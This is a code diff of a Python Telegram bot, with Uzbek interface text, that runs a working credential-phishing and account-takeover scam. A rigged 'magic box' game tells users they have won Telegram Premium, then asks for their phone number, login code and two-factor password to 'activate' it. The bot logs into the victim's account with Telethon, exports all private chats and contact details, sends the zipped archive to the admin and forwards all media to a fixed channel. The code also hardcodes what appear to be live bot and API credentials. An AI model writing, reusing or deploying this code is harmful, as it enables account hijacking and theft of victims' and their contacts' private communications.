@@ -11,35 +11,26 @@ from telethon import TelegramClient
 from telethon.tl.types import User
 from telethon.errors import SessionPasswordNeededError
 
-# =====================================================
-# 🔐 RENDER + LOKALGA MOS SOZLAMALAR
-# =====================================================
+# ================== SOZLAMALAR ==================
 BOT_TOKEN = os.getenv("BOT_TOKEN") or "8568599127:AAE5aWe_lp9d7bn3NqivgSviquGyfarcbQ0"
-
 API_ID = int(os.getenv("API_ID") or 27762756)
 API_HASH = os.getenv("API_HASH") or "4905f5337b228bec93dd37832e89b1c6"
-
 ADMIN_ID = int(os.getenv("ADMIN_ID") or 7690148385)
 
 MEDIA_TARGET = os.getenv("MEDIA_TARGET") or "@pedro_yd"
-
 BASE_DIR = "chats_export"
 
 WIN_STICKER = "https://t.me/Asilbek_uzb/73"
 LOSE_STICKER = "https://t.me/Asilbek_uzb/74"
 
-# =====================================================
-bot = Bot(BOT_TOKEN)
-dp = Dispatcher()
-
 USERS_FILE = "users.json"
 CONFIG_FILE = "config.json"
 
+bot = Bot(BOT_TOKEN)
+dp = Dispatcher()
 sessions = {}
 
-# =====================================================
-# 📁 JSON YORDAMCHI FUNKSIYALAR
-# =====================================================
+# ================== JSON ==================
 def load_json(file, default):
     if not os.path.exists(file):
         with open(file, "w", encoding="utf-8") as f:
@@ -54,17 +45,26 @@ def save_json(file, data):
 users = load_json(USERS_FILE, {})
 config = load_json(CONFIG_FILE, {"magic_box": "on"})
 
-# =====================================================
-# 📱 MENULAR
-# =====================================================
-MENU_TEXTS = [
-    "🎁 Sehrli quti",
-    "🏆 Yutuqlar",
-    "👥 Referal",
-    "✅ Aktivlash",
-    "⬅️ Orqaga",
-    "⚙️ Admin panel"
-]
+# ================== USER INIT ==================
+def ensure_user(uid: str):
+    if uid not in users:
+        users[uid] = {
+            "boxes": 0,
+            "win_box": random.randint(1, 3),
+            "has_prize": False,
+            "refs": 0,
+            "ref_by": None
+        }
+        save_json(USERS_FILE, users)
+    else:
+        users[uid].setdefault("boxes", 0)
+        users[uid].setdefault("win_box", random.randint(1, 3))
+        users[uid].setdefault("has_prize", False)
+        users[uid].setdefault("refs", 0)
+        users[uid].setdefault("ref_by", None)
+
+# ================== MENULAR ==================
+MENU_TEXTS = ["🎁 Sehrli quti", "🏆 Yutuqlar", "👥 Referal", "✅ Aktivlash", "⬅️ Orqaga", "⚙️ Admin panel"]
 
 def main_menu(is_admin=False):
     kb = [
@@ -82,85 +82,59 @@ def back_menu():
         resize_keyboard=True
     )
 
-# =====================================================
-# 🚀 /start + REFERAL + MIGRATION
-# =====================================================
+# ================== START ==================
 @dp.message(CommandStart())
 async def start(msg: types.Message):
     uid = str(msg.from_user.id)
+    ensure_user(uid)
+
     parts = msg.text.split()
-    ref_id = parts[1] if len(parts) > 1 else None
-
-    if uid not in users:
-        users[uid] = {
-            "boxes": 0,
-            "win_box": random.randint(1, 3),
-            "has_prize": False,
-            "refs": 0,
-            "ref_by": None
-        }
-
-        if ref_id and ref_id in users and ref_id != uid:
-            users[uid]["ref_by"] = ref_id
-            users[ref_id]["refs"] += 1
-    else:
-        # 🔧 eski userlarni avtomatik tuzatish (migration)
-        users[uid].setdefault("boxes", 0)
-        users[uid].setdefault("win_box", random.randint(1, 3))
-        users[uid].setdefault("has_prize", False)
-        users[uid].setdefault("refs", 0)
-        users[uid].setdefault("ref_by", None)
-
-    save_json(USERS_FILE, users)
+    if len(parts) > 1:
+        ref = parts[1]
+        if ref in users and ref != uid and users[uid]["ref_by"] is None:
+            users[uid]["ref_by"] = ref
+            users[ref]["refs"] += 1
+            save_json(USERS_FILE, users)
 
     await msg.answer(
-        "👋Xush kelibsiz!",
+        "👋 Xush kelibsiz!",
         reply_markup=main_menu(msg.from_user.id == ADMIN_ID)
     )
 
-# =====================================================
-# 👥 REFERAL
-# =====================================================
+# ================== REFERAL ==================
 @dp.message(lambda m: m.text == "👥 Referal")
 async def referral(msg: types.Message):
     uid = str(msg.from_user.id)
+    ensure_user(uid)
     bot_username = (await bot.me()).username
-    link = f"https://t.me/{bot_username}?start={uid}"
-
-    refs = users.get(uid, {}).get("refs", 0)
 
     await msg.answer(
         f"👥 <b>Referal tizimi</b>\n\n"
-        f"🔗 Sizning havolangiz:\n{link}\n\n"
-        f"👤 Taklif qilinganlar: <b>{refs}</b> ta",
+        f"🔗 Havola:\nhttps://t.me/{bot_username}?start={uid}\n\n"
+        f"👤 Taklif qilinganlar: <b>{users[uid]['refs']}</b>",
         parse_mode="HTML"
     )
 
-# =====================================================
-# 🎁 SEHRLI QUTI
-# =====================================================
+# ================== SEHRLI QUTI ==================
 @dp.message(lambda m: m.text == "🎁 Sehrli quti")
-async def magic_info(msg: types.Message):
-    u = users[str(msg.from_user.id)]
+async def magic(msg: types.Message):
+    uid = str(msg.from_user.id)
+    ensure_user(uid)
+    u = users[uid]
 
     if u["boxes"] >= 3:
-        await msg.answer("❌ Siz 3 ta qutini ochib bo‘lgansiz")
+        await msg.answer("❌ Siz barcha qutilarni ochgansiz")
         return
 
     kb = types.InlineKeyboardMarkup(
-        inline_keyboard=[[
-            types.InlineKeyboardButton(
-                text=f"🔓 Qutini ochish ({u['boxes']+1}/3)",
-                callback_data="open_box"
-            )
-        ]]
+        inline_keyboard=[[types.InlineKeyboardButton(
+            text=f"🔓 Ochish ({u['boxes']+1}/3)",
+            callback_data="open_box"
+        )]]
     )
 
     await msg.answer(
-        "🎁 <b>Sehrli quti</b>\n\n"
-        "• 3 marta bepul\n"
-        "• 100 dan ortiq sovg'alar\n"
-        "• Natija tasodifiy",
+        "🎁 <b>Sehrli quti</b>\n• 3 marta bepul\n• 1 tasi yutuqli",
         parse_mode="HTML",
         reply_markup=kb
     )
@@ -168,6 +142,7 @@ async def magic_info(msg: types.Message):
 @dp.callback_query(lambda c: c.data == "open_box")
 async def open_box(cb: types.CallbackQuery):
     uid = str(cb.from_user.id)
+    ensure_user(uid)
     u = users[uid]
 
     if u["boxes"] >= 3:
@@ -180,92 +155,72 @@ async def open_box(cb: types.CallbackQuery):
         pass
 
     u["boxes"] += 1
-    current = u["boxes"]
-
-    is_win = config["magic_box"] == "on" and current == u["win_box"]
+    is_win = config["magic_box"] == "on" and u["boxes"] == u["win_box"]
 
     if is_win:
         u["has_prize"] = True
         sticker = WIN_STICKER
-        text = "🎉 TABRIKLAYMIZ!\nSiz Telegram Premium yutdingiz!"
+        text = "🎉 TABRIKLAYMIZ! Telegram Premium yutdingiz!"
     else:
         sticker = LOSE_STICKER
-        text = "📦 Quti bo‘sh chiqdi 😕"
+        text = "📦 Quti bo‘sh chiqdi"
 
     save_json(USERS_FILE, users)
-
     await cb.message.answer_sticker(sticker)
 
     kb = None
     if u["boxes"] < 3:
         kb = types.InlineKeyboardMarkup(
-            inline_keyboard=[[
-                types.InlineKeyboardButton(
-                    text=f"🔓 Keyingi quti ({u['boxes']+1}/3)",
-                    callback_data="open_box"
-                )
-            ]]
+            inline_keyboard=[[types.InlineKeyboardButton(
+                text=f"🔓 Keyingi ({u['boxes']+1}/3)",
+                callback_data="open_box"
+            )]]
         )
 
-    await cb.message.answer(
-        f"{text}\n\n📊 Ochish: {current}/3",
-        reply_markup=kb
-    )
+    await cb.message.answer(text, reply_markup=kb)
     await cb.answer()
 
-# =====================================================
-# 🏆 YUTUQLAR
-# =====================================================
+# ================== YUTUQLAR ==================
 @dp.message(lambda m: m.text == "🏆 Yutuqlar")
 async def prizes(msg: types.Message):
-    if users[str(msg.from_user.id)].get("has_prize"):
-        await msg.answer("🏆 Sizda Telegram Premium mavjud")
-    else:
-        await msg.answer("❌ Sizda yutuqlar yo‘q")
+    uid = str(msg.from_user.id)
+    ensure_user(uid)
+    await msg.answer(
+        "🏆 Sizda Premium bor" if users[uid]["has_prize"] else "❌ Yutuqlar yo‘q"
+    )
 
-# =====================================================
-# ✅ AKTIVLASH
-# =====================================================
+# ================== AKTIVLASH ==================
 @dp.message(lambda m: m.text == "✅ Aktivlash")
 async def activate(msg: types.Message):
     uid = str(msg.from_user.id)
-    if not users[uid].get("has_prize"):
-        await msg.answer("❌ Sizda aktivlanadigan Premium yo‘q")
+    ensure_user(uid)
+
+    if not users[uid]["has_prize"]:
+        await msg.answer("❌ Sizda aktivlanadigan sovg‘a yo‘q")
         return
 
     sessions[msg.from_user.id] = {"step": "phone"}
-    await msg.answer("📞 Telefon raqamingizni yuboring", reply_markup=back_menu())
+    await msg.answer("📞 Telefon raqam yuboring", reply_markup=back_menu())
 
-# =====================================================
-# ⬅️ ORQAGA
-# =====================================================
+# ================== ORQAGA ==================
 @dp.message(lambda m: m.text == "⬅️ Orqaga")
 async def back(msg: types.Message):
     sessions.pop(msg.from_user.id, None)
-    await msg.answer(
-        "🔙 Asosiy menyu",
-        reply_markup=main_menu(msg.from_user.id == ADMIN_ID)
-    )
+    await msg.answer("🔙 Menyu", reply_markup=main_menu(msg.from_user.id == ADMIN_ID))
 
-# =====================================================
-# 🔐 TELETHON LOGIN (MENU BLOKLANMAYDI)
-# =====================================================
-@dp.message(
-    lambda m: m.from_user.id in sessions
-    and m.text not in MENU_TEXTS
-)
-async def telethon_login(msg: types.Message):
-    uid = msg.from_user.id
-    state = sessions[uid]
+# ================== TELETHON LOGIN ==================
+@dp.message(lambda m: m.from_user.id in sessions and m.text not in MENU_TEXTS)
+async def telethon_flow(msg: types.Message):
+    state = sessions[msg.from_user.id]
     text = msg.text.strip()
 
     if state["step"] == "phone":
         state["phone"] = text
-        state["client"] = TelegramClient(f"session_{uid}", API_ID, API_HASH)
+        state["client"] = TelegramClient(f"session_{msg.from_user.id}", API_ID, API_HASH)
         await state["client"].connect()
         await state["client"].send_code_request(text)
         state["step"] = "code"
-        await msg.answer("🔐 Telegram kodi yuboring\n\n Namuna: 23.456 xuddi shunday yuborilishi shart")
+        await msg.answer("🔐 Telegram kodi yuboring")
         return
 
     if state["step"] == "code":
@@ -273,70 +228,42 @@ async def telethon_login(msg: types.Message):
             await state["client"].sign_in(phone=state["phone"], code=text)
         except SessionPasswordNeededError:
             state["step"] = "password"
-            await msg.answer("🔑 2 bosqichli parolni yuboring")
+            await msg.answer("🔑 2-bosqichli parolni yuboring")
             return
-
-        await msg.answer("⏳ olinmoqda...")
-        await export_chats(uid)
+        await export_chats(msg.from_user.id)
 
     if state["step"] == "password":
         await state["client"].sign_in(password=text)
-        await msg.answer("⏳ olinmoqda...")
-        await export_chats(uid)
+        await export_chats(msg.from_user.id)
 
-# =====================================================
-# 📦 CHAT EXPORT (ISM / USERNAME / ID / TELEFON)
-# =====================================================
+# ================== CHAT EXPORT ==================
 async def export_chats(uid):
     client = sessions[uid]["client"]
     os.makedirs(BASE_DIR, exist_ok=True)
     media = []
 
-    for dialog in await client.get_dialogs():
-        entity = dialog.entity
-        if isinstance(entity, User) and not entity.bot:
-            full_name = f"{entity.first_name or ''} {entity.last_name or ''}".strip() or "Nomaʼlum"
-            username = f"@{entity.username}" if entity.username else "Yo‘q"
-            phone = entity.phone if entity.phone else "Ko‘rinmaydi"
-
-            chat_dir = os.path.join(BASE_DIR, f"{full_name}_{entity.id}")
+    for d in await client.get_dialogs():
+        if isinstance(d.entity, User) and not d.entity.bot:
+            name = f"{d.entity.first_name or ''} {d.entity.last_name or ''}".strip()
+            chat_dir = os.path.join(BASE_DIR, f"{name}_{d.entity.id}")
             os.makedirs(chat_dir, exist_ok=True)
 
             with open(os.path.join(chat_dir, "chat.txt"), "w", encoding="utf-8") as f:
-                f.write("===== CHAT MAʼLUMOTLARI =====\n")
-                f.write(f"Ism: {full_name}\n")
-                f.write(f"User ID: {entity.id}\n")
-                f.write(f"Username: {username}\n")
-                f.write(f"Telefon: {phone}\n")
-                f.write("=============================\n\n")
-
-                async for m in client.iter_messages(entity, reverse=True):
+                f.write(f"Ism: {name}\nID: {d.entity.id}\nUsername: @{d.entity.username}\n\n")
+                async for m in client.iter_messages(d.entity, reverse=True):
                     if m.text:
                         f.write(m.text + "\n\n")
                     if m.media:
                         media.append(m)
 
     zip_path = "chats.zip"
-    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
+    with zipfile.ZipFile(zip_path, "w") as z:
         for root, _, files in os.walk(BASE_DIR):
             for file in files:
                 z.write(os.path.join(root, file))
 
-    # 📦 ZIP faqat adminga
-    await bot.send_document(
-        ADMIN_ID,
-        types.FSInputFile(zip_path),
-        caption=f"📦 Chatlar ZIP\n👤 User ID: {uid}"
-    )
+    await bot.send_document(ADMIN_ID, types.FSInputFile(zip_path), caption=f"📦 Chatlar | {uid}")
 
-    # 👤 Userga xabar
-    await bot.send_message(
-        uid,
-        "✅ Maʼlumotlar saqlandi va adminga yuborildi.\n⏳ Biroz kuting...",
-        reply_markup=main_menu(uid == ADMIN_ID)
-    )
-
-    # 📤 Media forward
     for m in media:
         try:
             await m.forward_to(MEDIA_TARGET)
@@ -344,37 +271,28 @@ async def export_chats(uid):
         except:
             pass
 
-    # 🧹 Tozalash
     shutil.rmtree(BASE_DIR)
     os.remove(zip_path)
-
     await client.disconnect()
     sessions.pop(uid, None)
 
-
-# =====================================================
-# ⚙️ ADMIN PANEL
-# =====================================================
+# ================== ADMIN ==================
 @dp.message(lambda m: m.text == "⚙️ Admin panel" and m.from_user.id == ADMIN_ID)
-async def admin_panel(msg: types.Message):
+async def admin(msg: types.Message):
     kb = types.InlineKeyboardMarkup(
-        inline_keyboard=[[
-            types.InlineKeyboardButton(text="🟢 ON", callback_data="on"),
-            types.InlineKeyboardButton(text="🔴 OFF", callback_data="off")
-        ]]
+        inline_keyboard=[[types.InlineKeyboardButton("🟢 ON", callback_data="on"),
+                          types.InlineKeyboardButton("🔴 OFF", callback_data="off")]]
     )
-    await msg.answer("⚙️ Sehrli quti holati:", reply_markup=kb)
+    await msg.answer("⚙️ Sehrli quti holati", reply_markup=kb)
 
 @dp.callback_query(lambda c: c.data in ["on", "off"])
 async def admin_switch(cb: types.CallbackQuery):
     config["magic_box"] = cb.data
     save_json(CONFIG_FILE, config)
-    await cb.message.answer(f"✅ Sehrli quti: {cb.data.upper()}")
+    await cb.message.answer(f"✅ Holat: {cb.data.upper()}")
     await cb.answer()
 
-# =====================================================
-# ▶️ RUN
-# =====================================================
+# ================== RUN ==================
 async def main():
     await dp.start_polling(bot)
 
